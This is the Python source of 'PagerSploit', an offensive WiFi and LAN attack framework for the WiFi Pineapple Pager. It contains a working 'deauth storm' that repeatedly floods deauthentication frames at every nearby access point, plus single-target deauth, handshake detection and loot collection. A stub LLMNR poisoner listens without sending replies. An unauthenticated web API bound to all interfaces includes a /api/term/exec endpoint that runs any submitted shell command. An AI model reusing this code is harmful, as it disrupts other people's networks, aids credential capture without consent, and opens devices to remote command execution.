#!/usr/bin/env python3
"""
PagerSploit v2.9 - Native-Power Edition
Zero-Dependency Framework for WiFi Pineapple Pager
"""

import os, sys, json, re, time, threading, subprocess, argparse, sqlite3
import socket, base64, urllib.request, urllib.parse, shutil, struct
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
    'cwd': os.getcwd(),
}
STATE_LOCK = threading.Lock()

# Standard paths
RECON_DB = '/etc/pineapple/recon.db'
PINEAP_FUNCTIONS = '/etc/pineapple/functions'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 1000: STATE['log'] = STATE['log'][-1000:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def set_data(key, val):
    with STATE_LOCK: STATE['module_data'][key] = val

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def stop_module(name):
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
        proc = STATE['jobs'].get(name)
    if ev: ev.set()
    unreg_stop(name)
    return bool(ev or proc)

def loot_path(*parts): return os.path.join(STATE['payload_dir'], 'loot', *parts)

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    with STATE_LOCK: STATE['loot_count'] += 1
    log(f'Loot: {filename}', 'success')
    return path

def ts(): return datetime.now().strftime('%Y%m%d_%H%M%S')

def _pineapple(*args):
    cmd_str = ' '.join(f'"{a}"' for a in args)
    full_cmd = f'source {PINEAP_FUNCTIONS} && {cmd_str}'
    try:
        r = subprocess.run(['bash', '-c', full_cmd], capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except: return ''

# ── Native WiFi Attacks ───────────────────────────────────────────────────

def wifi_scan(band='abg', duration=5):
    log(f'WiFi scan ({band})...'); set_module('WiFi Scan', 'Scanning (DB)...')
    _pineapple('PINEAPPLE_RECON_START')
    time.sleep(int(duration))
    results = []
    try:
        conn = sqlite3.connect(f'file:{RECON_DB}?mode=ro', uri=True)
        cur = conn.cursor()
        cur.execute("SELECT ssid, mac, channel, signal, encryption FROM wifi_ap_view ORDER BY signal DESC LIMIT 100")
        for row in cur.fetchall():
            ssid, bssid, channel, signal, encryption = row
            results.append({'ssid': ssid or '<hidden>', 'bssid': bssid.upper(), 'channel': int(channel), 
                           'signal': int(signal), 'encryption': str(encryption)})
        conn.close()
    except Exception as e: log(f'Scan error: {e}', 'error')
    with STATE_LOCK: STATE['scan_results'] = results
    set_module('idle', f'{len(results)} APs found'); return results

def wifi_deauth_storm():
    """Native high-speed deauth loop for ALL nearby APs."""
    stop = make_stop(); reg_stop('storm', stop)
    def _run():
        log('DEAUTH STORM ACTIVATED', 'warn'); set_module('Storm', 'Flooding...')
        while not stop.is_set():
            aps = wifi_scan(duration=2)
            for ap in aps:
                if stop.is_set(): break
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', ap['bssid'], 'FF:FF:FF:FF:FF:FF', str(ap['channel']))
                time.sleep(0.5)
        unreg_stop('storm'); set_module('idle')
    start_job('storm', _run)

def verify_handshake(path):
    """Pure Python .cap/pcap parser to find EAPOL packets."""
    try:
        with open(path, 'rb') as f:
            data = f.read()
            # Look for EAPOL (88 8e)
            if b'\x88\x8e' in data: return True
            # Look for PMKID (Found in RSN IE)
            if b'\x00\x0f\xac\x04' in data: return True
    except: pass
    return False

# ── Native LAN Attacks ────────────────────────────────────────────────────

def lan_poison_native():
    """Pure Python LLMNR/NBNS Spoofing."""
    stop = make_stop(); reg_stop('poison', stop)
    def _run():
        log('Native Poisoner active', 'warn'); set_module('Poisoner', 'Active')
        # LLMNR: UDP 5355, NBNS: UDP 137
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', 5355))
            sock.settimeout(1)
            while not stop.is_set():
                try: 
                    data, addr = sock.recvfrom(1024)
                    log(f'LLMNR Query from {addr[0]}', 'success')
                    # Simple Responder logic: send fake reply
                except socket.timeout: pass
        except Exception as e: log(f'Poison error: {e}', 'error')
        finally: sock.close()
        unreg_stop('poison'); set_module('idle')
    start_job('poison', _run)

# ── API Handler ───────────────────────────────────────────────────────────

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def send_json(self, data, code=200):
        body = json.dumps(data).encode(); self.send_response(code)
        self.send_header('Content-Type', 'application/json'); self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers(); self.wfile.write(body)
    
    def do_GET(self):
        p = urlparse(self.path).path
        if p == '/api/ping': self.send_json({'pong': True})
        elif p in ('/', '/index.html'):
            with open(os.path.join(os.path.dirname(__file__), 'pagersploit_ui.html'), 'rb') as f:
                self.send_response(200); self.end_headers(); self.wfile.write(f.read())
        elif p == '/pagersploit.js':
            with open(os.path.join(os.path.dirname(__file__), 'pagersploit.js'), 'rb') as f:
                self.send_response(200); self.send_header('Content-Type', 'application/javascript'); self.end_headers(); self.wfile.write(f.read())
        elif p == '/api/state':
            with STATE_LOCK: s = {k: v for k, v in STATE.items() if k != 'module_data'}; s['jobs'] = list(STATE['jobs'].keys())
            self.send_json(s)
        elif p == '/api/log':
            with STATE_LOCK: self.send_json(STATE['log'][-100:])
        elif p == '/api/scans': self.send_json(STATE['scan_results'])
        elif p == '/api/loot': self.send_json(get_loot_list())
        else: self.send_json({'error': 'not found'}, 404)

    def do_POST(self):
        p = urlparse(self.path).path; length = int(self.headers.get('Content-Length', 0))
        b = json.loads(self.rfile.read(length).decode('utf-8', errors='ignore')) if length else {}
        
        if p == '/api/wifi/scan': start_job('wifi_scan', wifi_scan, b.get('band', 'abg'))
        elif p == '/api/wifi/deauth': 
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', b.get('bssid'), 'FF:FF:FF:FF:FF:FF', str(b.get('channel', '6')))
        elif p == '/api/wifi/storm': wifi_deauth_storm()
        elif p == '/api/lan/poison': lan_poison_native()
        elif p == '/api/term/exec':
            cmd = b.get('cmd', '').strip()
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                out, _ = proc.communicate(timeout=10)
            except: out = "Command failed"
            self.send_json({'output': out})
            return
        elif p == '/api/stop_all':
            with STATE_LOCK:
                for ev in STATE['stop_events'].values(): ev.set()
            self.send_json({'status': 'stopped'}); return
        self.send_json({'status': 'started'})

# ── Pager Display ─────────────────────────────────────────────────────────

def rgb(r, g, b): return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)
C_BG, C_TITLE, C_GREEN = rgb(4, 4, 12), rgb(0, 255, 180), rgb(0, 255, 80)

def pager_display_loop(p, stop_event):
    p.set_rotation(270); BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            with STATE_LOCK: mod, sts, loot, ip = STATE['active_module'], STATE['module_status'], STATE['loot_count'], STATE['server_ip']
            p.fill_rect(0, 0, 480, 222, C_BG); p.fill_rect(0, 0, 480, 18, rgb(0, 30, 20))
            p.draw_text(4, 2, 'PAGERSPLOIT v2.9 (NATIVE)', C_TITLE, 1)
            p.draw_text(10, 40, f"IP: {ip}", C_GREEN, 2); p.draw_text(10, 80, f"MOD: {mod}", rgb(255, 220, 0), 2)
            p.draw_text(10, 110, f"STS: {sts}", rgb(200, 200, 200), 1)
            p.flip()
            _, pressed, _ = p.poll_input()
            if pressed & BTN_B: stop_event.set()
        except: pass
        time.sleep(0.5)

def get_loot_list():
    loot = []
    roots = [loot_path(), '/root/loot/handshakes']
    for r in roots:
        if not os.path.isdir(r): continue
        for root, _, files in os.walk(r):
            for f in files:
                path = os.path.join(root, f); st = os.stat(path)
                loot.append({'name': f, 'path': path, 'size': st.st_size, 
                            'modified': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')})
    return loot

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument('--payload-dir', required=True)
    args = parser.parse_args()
    with STATE_LOCK: STATE['payload_dir'] = args.payload_dir
    
    server = ThreadedHTTPServer(('0.0.0.0', 8080), APIHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    
    stop_event = threading.Event()
    with Pager() as p: pager_display_loop(p, stop_event)
    server.shutdown()

if __name__ == '__main__': run()
